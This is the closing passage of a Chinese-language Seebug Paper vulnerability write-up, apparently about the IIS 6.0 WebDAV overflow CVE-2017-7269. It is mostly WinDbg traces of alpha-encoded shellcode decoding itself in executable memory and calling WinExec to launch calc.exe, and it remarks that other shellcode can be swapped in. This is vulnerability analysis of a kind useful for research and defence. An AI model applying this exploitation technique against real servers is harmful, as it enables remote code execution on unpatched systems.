<span class="mi">68031460</span>  <span class="mi">00560056</span> <span class="mi">00410059</span> <span class="mi">00340034</span> <span class="mi">00340034</span>  <span class="n">V</span><span class="o">.</span><span class="na">V</span><span class="o">.</span><span class="na">Y</span><span class="o">.</span><span class="na">A</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span>
<span class="mi">68031470</span>  <span class="mi">00340034</span> <span class="mi">00340034</span> <span class="mi">00340034</span> <span class="mi">00410051</span>  <span class="mf">4.4</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span><span class="mf">4.4</span><span class="o">.</span><span class="na">Q</span><span class="o">.</span><span class="na">A</span><span class="o">.</span>
</pre></div>


<p>之后进入alpha shellcode，这时候68031460作为shareduserdata，已经具备可执行权限。</p>
<div class="codehilite"><pre><span></span>Failed to map Heaps (error 80004005)
Usage:                  Image
Allocation Base:        68000000
Base Address:           68031000
End Address:            68032000
Region Size:            00001000
Type:                   01000000    MEM_IMAGE
State:                  00001000    MEM_COMMIT
Protect:                00000040    PAGE_EXECUTE_READWRITE  有了可执行权限
</pre></div>


<p>这里由于url存入内存按照宽字节存放，因此都是以00 xx方式存放，因此不能单纯使用shellcode，而得用alpha shellcode（结尾基友用了另一种方法执行shellcode，大家可以看下），alpha shellcode会先执行一段操作。随后进入解密部分。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">059003</span><span class="n">d9</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031585</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031568</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6803154</span><span class="n">e</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000292</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x292</span><span class="o">:</span>
<span class="mi">6803154</span><span class="n">e</span> <span class="mi">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">059003</span><span class="n">d9</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031586</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031568</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6803154</span><span class="n">f</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x293</span><span class="o">:</span>
<span class="mi">6803154</span><span class="n">f</span> <span class="mi">004200</span>          <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">edx</span><span class="o">],</span><span class="n">al</span>          <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">68031568</span><span class="o">=</span><span class="n">e3</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">059003</span><span class="n">d9</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031586</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031568</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68031552</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">cy</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000283</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x296</span><span class="o">:</span>
<span class="mi">68031552</span> <span class="mi">6</span><span class="n">b0110</span>          <span class="n">imul</span>    <span class="n">eax</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ecx</span><span class="o">],</span><span class="mi">10</span><span class="n">h</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">68031586</span><span class="o">=</span><span class="mi">00540032</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">05400320</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031586</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031568</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68031555</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x299</span><span class="o">:</span>
<span class="mi">68031555</span> <span class="mi">024102</span>          <span class="n">add</span>     <span class="n">al</span><span class="o">,</span><span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ecx</span><span class="o">+</span><span class="mi">2</span><span class="o">]</span>        <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">68031588</span><span class="o">=</span><span class="mi">54</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">05400374</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031586</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031568</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68031558</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x29c</span><span class="o">:</span>
<span class="mi">68031558</span> <span class="mi">8802</span>            <span class="n">mov</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">edx</span><span class="o">],</span><span class="n">al</span>          <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">68031568</span><span class="o">=</span><span class="n">bc</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">05400374</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031586</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031568</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6803155</span><span class="n">a</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x29e</span><span class="o">:</span>
<span class="mi">6803155</span><span class="n">a</span> <span class="mi">42</span>              <span class="n">inc</span>     <span class="n">edx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">05400374</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031586</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031569</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6803155</span><span class="n">b</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x29f</span><span class="o">:</span>
<span class="mi">6803155</span><span class="n">b</span> <span class="mi">803941</span>          <span class="n">cmp</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ecx</span><span class="o">],</span><span class="mi">41</span><span class="n">h</span>         <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">68031586</span><span class="o">=</span><span class="mi">32</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">05400374</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031586</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031569</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6803155</span><span class="n">e</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">cy</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000283</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x2a2</span><span class="o">:</span>
<span class="mi">6803155</span><span class="n">e</span> <span class="mi">75</span><span class="n">e2</span>            <span class="n">jne</span>     <span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x286</span> <span class="o">(</span><span class="mi">68031542</span><span class="o">)</span>       <span class="o">[</span><span class="n">br</span><span class="o">=</span><span class="mi">1</span><span class="o">]</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">68031580</span>
<span class="mi">68031580</span>  <span class="mi">00380059</span> <span class="mi">00320059</span> <span class="mi">004</span><span class="n">d0054</span> <span class="mi">004</span><span class="n">a0054</span>
<span class="mi">68031590</span>  <span class="mi">00310054</span> <span class="mi">0030004</span><span class="n">d</span> <span class="mi">00370031</span> <span class="mi">00360059</span>
<span class="mi">680315</span><span class="n">a0</span>  <span class="mi">00300051</span> <span class="mi">00300031</span> <span class="mi">00300031</span> <span class="mi">004</span><span class="n">c0045</span>
<span class="mi">680315</span><span class="n">b0</span>  <span class="mi">004</span><span class="n">b0053</span> <span class="mi">00300053</span> <span class="mi">004</span><span class="n">c0045</span> <span class="mi">00330053</span>
</pre></div>


<p>可以看到，解密前，alpha shellcod部分，随后解密结束之后。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">04</span><span class="n">d0035d</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031592</span> <span class="n">edx</span><span class="o">=</span><span class="mi">6803156</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6803155</span><span class="n">e</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">cy</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000287</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x2a2</span><span class="o">:</span>
<span class="mi">6803155</span><span class="n">e</span> <span class="mi">75</span><span class="n">e2</span>            <span class="n">jne</span>     <span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x286</span> <span class="o">(</span><span class="mi">68031542</span><span class="o">)</span>       <span class="o">[</span><span class="n">br</span><span class="o">=</span><span class="mi">1</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="mi">68031560</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000410</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680318</span><span class="n">da</span> <span class="n">edx</span><span class="o">=</span><span class="mi">6803163</span><span class="n">e</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68031560</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x2a4</span><span class="o">:</span>
<span class="mi">68031560</span> <span class="n">b8b726bfca</span>      <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="mi">0</span><span class="n">CABF26B7h</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">68031580</span>
<span class="mi">68031580</span>  <span class="mi">223</span><span class="n">cec9b</span> <span class="mi">265</span><span class="n">a2caa</span> <span class="mi">6</span><span class="n">a289c9c</span> <span class="mi">9</span><span class="n">f7c5610</span>
<span class="mi">68031590</span>  <span class="mi">90</span><span class="n">a91aa3</span> <span class="mi">9</span><span class="n">f8f9004</span> <span class="n">beec8995</span> <span class="mi">6120</span><span class="n">d015</span>
<span class="mi">680315</span><span class="n">a0</span>  <span class="mi">60351</span><span class="n">b24</span> <span class="mi">30</span><span class="n">b44661</span> <span class="n">a56b0c3a</span> <span class="mi">4</span><span class="n">eb0584f</span>
<span class="mi">680315</span><span class="n">b0</span>  <span class="n">b3b04c03</span> <span class="mi">65916</span><span class="n">fd3</span> <span class="mi">87313668</span> <span class="mi">9</span><span class="n">f7842bd</span>
<span class="mi">680315</span><span class="n">c0</span>  <span class="mi">14326</span><span class="n">fa2</span> <span class="n">fcc51b10</span> <span class="n">c16ae469</span> <span class="mi">05721746</span>
<span class="mi">680315</span><span class="n">d0</span>  <span class="mi">7</span><span class="n">f01c860</span> <span class="mi">44127593</span> <span class="mi">5</span><span class="n">f97a1ee</span> <span class="mi">840</span><span class="n">f2148</span>
<span class="mi">680315</span><span class="n">e0</span>  <span class="mi">4</span><span class="n">fd6e669</span> <span class="mi">089</span><span class="n">c4365</span> <span class="mi">23715269</span> <span class="n">e474df95</span>
</pre></div>


<p>shellcode已经被解密出来，随后会调用winexec，执行calc。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">77</span><span class="n">ea411e</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031614</span> <span class="n">edx</span><span class="o">=</span><span class="mi">876</span><span class="n">f8b31</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">680315</span><span class="n">f9</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">fc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">68031581</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x33d</span><span class="o">:</span>
<span class="mi">680315</span><span class="n">f9</span> <span class="mi">51</span>              <span class="n">push</span>    <span class="n">ecx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">77</span><span class="n">ea411e</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">68031614</span> <span class="n">edx</span><span class="o">=</span><span class="mi">876</span><span class="n">f8b31</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">680315</span><span class="n">fa</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">f8</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">68031581</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x33e</span><span class="o">:</span>
<span class="mi">680315</span><span class="n">fa</span> <span class="n">ffe0</span>            <span class="n">jmp</span>     <span class="n">eax</span> <span class="o">{</span><span class="n">kernel32</span><span class="o">!</span><span class="n">WinExec</span> <span class="o">(</span><span class="mi">77</span><span class="n">ea411e</span><span class="o">)}</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span>
<span class="mi">680313</span><span class="n">f8</span>  <span class="mi">68031614</span> <span class="mi">68031633</span> <span class="mi">00000001</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="mi">68031633</span> <span class="n">l2</span>
<span class="mi">68031633</span>  <span class="mi">636</span><span class="n">c6163</span> <span class="mi">6578652</span><span class="n">e</span>                    <span class="n">calc</span><span class="o">.</span><span class="na">exe</span>
</pre></div>


<p>第二个参数是0x1，是SW_SHOWNORMAL，但由于服务无窗口，因此calc无法弹出。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/4-4.png-w331s" /></p>
<p>其实，这个过程可以替换成其他的shellcode，相关的shellcode替换链接可以看我的好基友LCatro的几篇文章，都非常不错。</p>
<p>https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/</p>
<p>最后我想说，我在深圳，刚才和几个平时网上的好朋友吃夜宵，聊到这个漏洞，没想到在几个小时前认识的彭博士，就是这个漏洞的作者！真的没有想到，还好自己分析的这套思路和这个漏洞作者的思路相差无几，不然就被打脸了。真的很有缘！一下学到了好多。</p>
<p>这篇最后还是没有按时发出，不过希望能和大家一起学习！谢谢阅读！</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/259/">https://paper.seebug.org/259/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/258/"><span aria-hidden="true">&larr;</span> Referrer spoofing with ifra...</a>
    
    
      <a class="older-posts" href="/261/">Defeating the popUp blocker... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=k0shl"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/005PzhAMjw8f81c3d8m10j30jg0hawhb.jpg)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=k0shl">k0shl</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=k0shl">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
